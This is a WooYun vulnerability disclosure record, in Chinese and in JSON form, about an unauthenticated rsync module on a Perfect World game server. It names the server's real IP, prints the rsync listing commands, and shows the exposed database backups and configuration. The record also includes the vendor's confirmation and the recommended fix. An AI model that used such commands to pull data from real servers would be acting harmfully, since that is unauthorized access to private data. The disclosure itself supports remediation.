{"id": 46855, "wybug_id": "wooyun-2014-089158", "wybug_title": "完美时空某rsync未授权访问泄露大量游戏数据备份", "wybug_corp": "完美时空", "wybug_author": "杀器王子", "wybug_date": "2014-12-29 12:54", "wybug_open_date": "2015-02-12 12:56", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向公众公开  简要描述： 完美时空某rsync未授权访问泄露大量游戏数据备份 详细说明：  \nrsync 58.215.52.26::backup/drwxr-xr-x        4096 2014/10/13 15:24:18 .-rw-r--r--    12270178 2014/09/30 10:13:21 862-598.log-rw-r--r--       85325 2014/09/30 09:59:29 abstractroles.598-rw-r--r--      147653 2014/09/30 09:59:18 abstractroles.862drwxr-xr-x          32 2014/09/30 08:34:28 centraldb-rw-r--r--  1382727739 2014/09/30 09:54:02 centraldb.tar.gz-rw-r--r--  1382724687 2014/09/30 10:19:08 centraldb_21.243.tar.gz-rw-r--r--  1445107860 2014/09/30 08:27:25 db_21.1.tar.gz-rw-r--r--   849604379 2014/09/30 08:26:42 db_22.133.tar.gzdrwxr-xr-x          32 2014/09/30 08:23:32 dbhomewdbdrwxr-xr-x          32 2014/09/30 08:23:29 dbhomewdb.862-rwxr-xr-x     1604840 2014/10/13 15:24:19 dbview-rwxr-xr-x    62084020 2014/09/30 09:54:22 gamedbd-rw-r--r--        2477 2014/09/30 09:54:11 gamesys.conf-rwxr-xr-x      123128 2014/09/30 09:19:29 itemid.txt-rwxr-xr-x        2658 2014/09/30 09:19:32 m_a.pl-rw-r--r--        3342 2014/09/30 08:24:55 md5_21.133-rw-r--r--        3342 2014/09/30 10:28:16 md5_centraldb-rwxr-xr-x         537 2014/09/30 09:58:59 merge.sh-rw-------         113 2014/09/30 09:59:02 nohup.out-rwxr-xr-x         540 2014/09/30 09:18:15 start_rsync.shdrwxr-xr-x          66 2014/10/13 15:17:19 youshuangdrwxr-xr-x          62 2014/10/13 15:21:51 ys\n   漏洞证明：  查看gamesys.conf\n[storage]homedir\t\t\t=\t./dbhomedatadir\t\t\t=\tdbdatalogdir\t\t\t=\tdblogsbackupdir\t\t=\t./backupcachesize\t\t=\t16777216errpfx\t\t\t=\tStoragecheckpoint_interval\t=\t60backup_lockfile\t=\t/tmp/.lockgamedbdquit_lockfile\t=\t/tmp/.quitgamedbdcompress\t\t=\t1[storagewdb]homedir\t\t\t=\t./dbhomewdbdatadir\t\t\t=\tdbdatalogdir\t\t\t=\tdblogsbackupdir\t\t=\t./backupcheckpoint_interval\t=\t60times_incbackup\t\t=\t1tables\t\t\t=\tauction,clsconfig,faction,factionname,inventory,messages,storehouse,top,user,base,config,friends,mailbox,rolename,status,task,waitdel,order,shoplog,gtask,family,familyname,citystore,syslog,sect,commondata,snsplayerinfo,snsmessage,clrrole,base2,referral,hometown,achievement,uniqueauction,circle,consign,finished_consign,gtactivate,friendcallback,award,dropcounter,rolenamehis,topflower,kingdom,operationcmd,weborder,factionbase,crssvrteams,crssvrteamsname,challengefinal,challengeaward,uniqueuser,uniquerole,annualpkpromotecache_high_default\t\t=\t8000cache_low_default\t\t=\t7500base_cache_high\t\t\t=\t50000base_cache_low\t\t\t=\t45000status_cache_high\t\t=\t50000status_cache_low\t\t=\t45000inventory_cache_high\t=\t50000inventory_cache_low\t\t=\t45000task_cache_high\t\t\t=\t50000task_cache_low\t\t\t=\t45000backup_lockfile\t\t\t=\t/tmp/.lockgamedbdquit_lockfile\t\t\t=\t/tmp/.quitgamedbd[gamedbd]noimportclsconfig\t=\t0;rolenameprefix\t\t=\tArolenamesuffix\t\t=\tB;factionnameprefix\t=\tAfactionnamesuffix\t=\tB;familynameprefix\t=\tAfamilynamesuffix\t=\tBallow_modify_inventory=0\n这里应该是游戏各个数据字段的备份\nrsync 58.215.52.26::backup/dbhomewdb/dbdata/drwxr-xr-x        4096 2014/09/30 10:13:19 .-rw-------  1776893952 2014/09/30 10:13:21 achievement-rw-------       12288 2014/09/30 10:13:21 annualpkpromote-rw-------        8192 2014/09/30 10:13:21 auction-rw-------   134750208 2014/09/30 10:13:21 award-rw-------   582098944 2014/09/30 10:13:21 base-rw-------   214130688 2014/09/30 10:13:21 base2-rw-------       12288 2014/09/30 10:13:21 challengeaward-rw-------       12288 2014/09/30 10:13:21 challengefinal-rw-------        8192 2014/09/30 10:13:21 circle-rw-------        8192 2014/09/30 10:13:21 citystore-rw-------        8192 2014/09/30 10:13:21 clrrole-rw-------        8192 2014/09/30 10:13:21 clsconfig-rw-------       12288 2014/09/30 10:13:21 commondata\n   修复方案：  加入授权   版权声明：转载请注明来源 杀器王子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-29 18:14 厂商回复： 感谢洞主对完美世界的关注，我们将尽快修补漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-29 12:54 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  我信洞主    \n     2014-12-29 17:23 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  我也信洞主    \n     2014-12-29 18:58 |    \t\t飞段 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:15        | 求收编，本人会注入，会上传，会Xss，会破...)\t\t \n  我也信    \n     2014-12-29 21:35 |    \t\tbingfeng \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 万丈红尘三杯酒，千秋大业一壶茶。)\t\t \n  我也信    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}